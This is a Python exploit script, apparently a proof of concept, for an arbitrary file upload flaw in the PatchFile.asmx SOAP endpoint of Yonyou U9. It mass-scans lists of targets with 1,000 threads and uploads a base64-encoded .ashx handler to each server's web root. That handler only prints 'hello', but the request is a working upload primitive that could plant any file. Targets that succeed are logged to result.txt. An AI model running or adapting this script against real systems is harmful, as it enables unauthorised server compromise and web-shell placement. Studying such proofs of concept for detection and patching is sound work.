import requests,argparse,sys
from multiprocessing.dummy import Pool
import json
requests.packages.urllib3.disable_warnings()

def main():
    banner()
    parser = argparse.ArgumentParser(description="用友U9 PatchFile.asmx接口存在任意文件上传漏洞")
    parser.add_argument('-u','--url',help="please input your url")
    parser.add_argument('-f','--file',help="please input your file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as fp:
            fo = fp.readlines()
            url_list = []
            for i in fo:
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(1000)
        mp.map(poc,url_list)
        mp.close()
        mp.join()

def banner():
    banner = '''
     __                            __                      __  __ 
    |  \                          |  \                    |  \|  \
    | $$____    ______    _______ | $$   __  __   __   __  \$$ \$$
    | $$    \  |      \  /       \| $$  /  \|  \ |  \ |  \|  \|  \
    | $$$$$$$\  \$$$$$$\|  $$$$$$$| $$_/  $$| $$ | $$ | $$| $$| $$
    | $$  | $$ /      $$| $$      | $$   $$ | $$ | $$ | $$| $$| $$
    | $$  | $$|  $$$$$$$| $$_____ | $$$$$$\ | $$_/ $$_/ $$| $$| $$
    | $$  | $$ \$$    $$ \$$     \| $$  \$$\ \$$   $$   $$| $$| $$
     \$$   \$$  \$$$$$$$  \$$$$$$$ \$$   \$$  \$$$$$\$$$$  \$$ \$$
                                                auther:lllo    
    '''
    print(banner)
def poc(target):
    headers = {
        'Connection': 'close',
        'Content-Type': 'text/xml; charset=utf-8',
        'SOAPAction': '\"http://tempuri.org/SaveFile\"',

    }
    data='''<?xml version="1.0" encoding="utf-8"?>
 <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
   <SaveFile xmlns="http://tempuri.org/">
    <binData>PCUgQCB3ZWJoYW5kbGVyIGxhbmd1YWdlPSJDIyIgY2xhc3M9IkF2ZXJhZ2VIYW5kbGVyIiAlPiAKdXNpbmcgU3lzdGVtOyAKdXNpbmcgU3lzdGVtLldlYjsgCgpwdWJsaWMgY2xhc3MgQXZlcmFnZUhhbmRsZXIgOiBJSHR0cEhhbmRsZXIgCnsgCiAgICBwdWJsaWMgYm9vbCBJc1JldXNhYmxlIAogICAgeyAKICAgICAgICBnZXQgewogICAgICAgICAgICAgcmV0dXJuIHRydWU7IAogICAgICAgICAgICB9IAogICAgICAgIH0gCiAgICAgICAgcHVibGljIHZvaWQgUHJvY2Vzc1JlcXVlc3QoSHR0cENvbnRleHQgY3R4KSAKICAgICAgICB7IAogICAgICAgICAgICBjdHguUmVzcG9uc2UuV3JpdGUoImhlbGxvIik7IAogICAgICAgIH0gCiAgICB9</binData>
    <path>./</path>
    <fileName>testtest.ashx</fileName>
   </SaveFile>
  </soap:Body>
 </soap:Envelope>'''
    proxies = {
        'http': '127.0.0.1:8080',
        'https': '127.0.0.1:8080'
    }


    url = target+'/U9Supplier/CS/Office/AutoUpdates/PatchFile.asmx'

    try:
        res = requests.post(url=url,data=data,headers=headers,timeout=5,proxies=proxies).text
        if "true" in res:
            with open('result.txt','a') as fp1:
                fp1.write(f"[+]{target} is veriable"+'\n')
        else:
            print(f'[-]{target} is not veriable')
    except:
        print(f'[*]{target} server erro')

if __name__ =='__main__':
    main()